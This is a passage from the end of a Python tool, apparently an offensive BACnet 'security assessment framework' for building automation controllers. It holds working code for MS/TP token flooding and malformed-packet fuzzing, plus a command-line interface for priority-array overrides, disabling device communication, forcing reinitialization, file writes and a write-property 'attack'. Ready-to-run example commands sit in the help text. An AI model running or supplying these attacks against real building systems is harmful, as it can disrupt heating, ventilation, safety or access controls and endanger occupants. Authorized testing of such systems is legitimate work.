            crc_data = 0xFFFF
            
            frame = preamble
            frame += struct.pack('BBBBB', frame_type, destination, source, data_length >> 8, data_length & 0xFF)
            frame += struct.pack('B', crc_header)
            frame += struct.pack('!H', crc_data)
            
            for _ in range(token_count):
                ser.write(frame)
                time.sleep(0.01)
            
            ser.close()
            
            self.log_event(
                "MS/TP Token Manipulation",
                "CRITICAL",
                serial_port,
                {"this_station": this_station, "next_station": next_station, "count": token_count},
                ["T0803", "T0804"]
            )
            logger.warning("[SUCCESS] Token manipulation completed")
            
        except Exception as e:
            logger.error(f"MS/TP manipulation error: {e}")
    
    def fuzz_service(self, device_instance: int, service_choice: int,
                    fuzz_iterations: int = 100) -> None:
        """
        Fuzz BACnet services with malformed packets
        
        MITRE: T0855 (Unauthorized Command Message)
        
        Args:
            device_instance: Target device instance number
            service_choice: Service to fuzz
            fuzz_iterations: Number of fuzz iterations
        """
        logger.warning(f"[ATTACK] Fuzzing service {service_choice} with {fuzz_iterations} iterations")
        
        import random
        
        for i in range(fuzz_iterations):
            fuzz_data = bytes([random.randint(0, 255) for _ in range(random.randint(1, 100))])
            
            self.invoke_id = (self.invoke_id % 255) + 1
            packet = BACnetPacket(
                bvlc_type=0x81,
                bvlc_function=0x0A,
                npdu_control=0x04,
                apdu_type=BACnetPDUType.CONFIRMED_REQUEST,
                service_choice=service_choice,
                invoke_id=self.invoke_id,
                data=fuzz_data
            )
            
            try:
                self._send_packet(packet)
            except Exception as e:
                logger.debug(f"Fuzz iteration {i} error: {e}")
            
            time.sleep(0.1)
        
        self.log_event(
            "Service Fuzzing",
            "HIGH",
            f"Device {device_instance}",
            {"service": service_choice, "iterations": fuzz_iterations},
            ["T0855"]
        )
        logger.warning(f"[COMPLETE] Fuzzing completed: {fuzz_iterations} iterations")
    
    def export_events(self, filename: str) -> None:
        """Export security events to JSON file"""
        with open(filename, 'w') as f:
            json.dump([e.to_dict() for e in self.security_events], f, indent=2)
        logger.info(f"Exported {len(self.security_events)} events to {filename}")
    
    def export_devices(self, filename: str) -> None:
        """Export discovered devices to JSON file"""
        with open(filename, 'w') as f:
            json.dump([d.to_dict() for d in self.devices], f, indent=2)
        logger.info(f"Exported {len(self.devices)} devices to {filename}")
    
    def export_objects(self, filename: str) -> None:
        """Export enumerated objects to JSON file"""
        with open(filename, 'w') as f:
            json.dump([o.to_dict() for o in self.objects], f, indent=2)
        logger.info(f"Exported {len(self.objects)} objects to {filename}")


def main():
    parser = argparse.ArgumentParser(
        description="BACnet Security Assessment Framework v1.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Discover devices:
    python bacnet_assessment.py --target 192.168.1.255 --discover
  
  Enumerate objects:
    python bacnet_assessment.py --target 192.168.1.100 --enumerate --device-id 1234
  
  Write property attack:
    python bacnet_assessment.py --target 192.168.1.100 --write-property --device-id 1234 --object-type 1 --object-instance 0 --property 85 --value 100.0 --priority 8
  
  Priority array manipulation:
    python bacnet_assessment.py --target 192.168.1.100 --priority-array --device-id 1234 --object-type 1 --object-instance 0 --priority 1 --value 50.0
  
  Device communication control:
    python bacnet_assessment.py --target 192.168.1.100 --comm-control --device-id 1234 --mode 1
  
  Reinitialize device:
    python bacnet_assessment.py --target 192.168.1.100 --reinitialize --device-id 1234 --state 1
  
  COV subscription:
    python bacnet_assessment.py --target 192.168.1.100 --subscribe-cov --device-id 1234 --object-type 2 --object-instance 5
  
  MS/TP token manipulation:
    python bacnet_assessment.py --mstp-token --serial-port COM3 --this-station 5 --next-station 10
  
  Fuzz service:
    python bacnet_assessment.py --target 192.168.1.100 --fuzz --service 15 --iterations 100
        """
    )
    
    parser.add_argument('--target', '-t', help='Target IP address')
    parser.add_argument('--port', '-p', type=int, default=47808, help='Target port (default: 47808)')
    parser.add_argument('--device-id', '-d', type=int, help='Device instance number')
    
    parser.add_argument('--discover', action='store_true', help='Discover BACnet devices')
    parser.add_argument('--enumerate', action='store_true', help='Enumerate objects on device')
    parser.add_argument('--write-property', action='store_true', help='Write property (attack)')
    parser.add_argument('--priority-array', action='store_true', help='Priority array manipulation')
    parser.add_argument('--comm-control', action='store_true', help='Device communication control')
    parser.add_argument('--reinitialize', action='store_true', help='Reinitialize device')
    parser.add_argument('--subscribe-cov', action='store_true', help='Subscribe to COV notifications')
    parser.add_argument('--atomic-write-file', action='store_true', help='Atomic write file')
    parser.add_argument('--mstp-token', action='store_true', help='MS/TP token manipulation')
    parser.add_argument('--fuzz', action='store_true', help='Fuzz BACnet services')
    
    parser.add_argument('--object-type', type=int, help='Object type')
    parser.add_argument('--object-instance', type=int, help='Object instance')
    parser.add_argument('--property', type=int, help='Property identifier')
    parser.add_argument('--value', help='Value to write')
    parser.add_argument('--priority', type=int, default=8, help='Write priority (1-16, default: 8)')
    parser.add_argument('--mode', type=int, help='Communication control mode (0=enable, 1=disable, 2=disable initiation)')
    parser.add_argument('--state', type=int, help='Reinitialization state (0=coldstart, 1=warmstart)')
    parser.add_argument('--serial-port', help='Serial port for MS/TP')
    parser.add_argument('--this-station', type=int, help='Source station address')
    parser.add_argument('--next-station', type=int, help='Destination station address')
    parser.add_argument('--service', type=int, help='Service choice for fuzzing')
    parser.add_argument('--iterations', type=int, default=100, help='Fuzzing iterations')
    parser.add_argument('--file-instance', type=int, help='File object instance')
    parser.add_argument('--file-data', help='File data to write')
    
    parser.add_argument('--export-events', help='Export events to JSON file')
    parser.add_argument('--export-devices', help='Export devices to JSON file')
    parser.add_argument('--export-objects', help='Export objects to JSON file')
    
    args = parser.parse_args()
    
    if args.target:
        framework = BACnetSecurityAssessment(args.target, args.port)
    else:
        framework = BACnetSecurityAssessment()
    
    try:
        if args.discover:
            devices = framework.discover_devices(args.target or "255.255.255.255")
            logger.info(f"Discovered {len(devices)} devices")
            
        elif args.enumerate:
            if not args.device_id:
                logger.error("--device-id required for enumeration")
                return
            objects = framework.enumerate_objects(args.device_id)
            logger.info(f"Enumerated {len(objects)} objects")
            
        elif args.write_property:
            if not all([args.device_id, args.object_type is not None, 
                       args.object_instance is not None, args.property is not None, args.value]):
                logger.error("--device-id, --object-type, --object-instance, --property, --value required")
                return
            
            try:
                if '.' in args.value:
                    value = float(args.value)
                elif args.value.lower() in ['true', 'false']:
                    value = args.value.lower() == 'true'
                elif args.value.isdigit():
                    value = int(args.value)
                else:
                    value = args.value
            except:
                value = args.value
            
            success = framework.write_property(
                args.device_id,
                args.object_type,
                args.object_instance,
                args.property,
                value,
                args.priority
            )
            logger.info(f"Write property: {'SUCCESS' if success else 'FAILED'}")
            
        elif args.priority_array:
            if not all([args.device_id, args.object_type is not None,
                       args.object_instance is not None, args.priority, args.value]):
                logger.error("--device-id, --object-type, --object-instance, --priority, --value required")
                return
            
            try:
                if '.' in args.value:
                    value = float(args.value)
                elif args.value.isdigit():
                    value = int(args.value)
                else:
                    value = args.value
            except:
                value = args.value
            
            success = framework.manipulate_priority_array(
                args.device_id,
                args.object_type,
                args.object_instance,
                args.priority,
                value
            )
            logger.info(f"Priority array manipulation: {'SUCCESS' if success else 'FAILED'}")
            
        elif args.comm_control:
            if not all([args.device_id, args.mode is not None]):
                logger.error("--device-id, --mode required")
                return
            success = framework.device_communication_control(args.device_id, args.mode)
            logger.info(f"Communication control: {'SUCCESS' if success else 'FAILED'}")
            
        elif args.reinitialize:
            if not all([args.device_id, args.state is not None]):
                logger.error("--device-id, --state required")
                return
            success = framework.reinitialize_device(args.device_id, args.state)
            logger.info(f"Device reinitialization: {'SUCCESS' if success else 'FAILED'}")
            
        elif args.subscribe_cov:
            if not all([args.device_id, args.object_type is not None, args.object_instance is not None]):
                logger.error("--device-id, --object-type, --object-instance required")
                return
            success = framework.subscribe_cov(args.device_id, args.object_type, args.object_instance)
            logger.info(f"COV subscription: {'SUCCESS' if success else 'FAILED'}")
            
        elif args.atomic_write_file:
            if not all([args.device_id, args.file_instance is not None, args.file_data]):
                logger.error("--device-id, --file-instance, --file-data required")
                return
            success = framework.atomic_write_file(
                args.device_id,
                args.file_instance,
                args.file_data.encode('utf-8')
            )
            logger.info(f"Atomic file write: {'SUCCESS' if success else 'FAILED'}")
            
        elif args.mstp_token:
            if not all([args.serial_port, args.this_station is not None, args.next_station is not None]):
                logger.error("--serial-port, --this-station, --next-station required")
                return
            framework.mstp_token_manipulation(args.serial_port, args.this_station, args.next_station)
            
        elif args.fuzz:
            if not all([args.device_id, args.service is not None]):
                logger.error("--device-id, --service required")
                return
            framework.fuzz_service(args.device_id, args.service, args.iterations)
        
        else:
            parser.print_help()
            return
        
        if args.export_events:
            framework.export_events(args.export_events)
        if args.export_devices:
            framework.export_devices(args.export_devices)
        if args.export_objects:
            framework.export_objects(args.export_objects)
            
    finally:
        framework._close_socket()


if __name__ == "__main__":
    main()
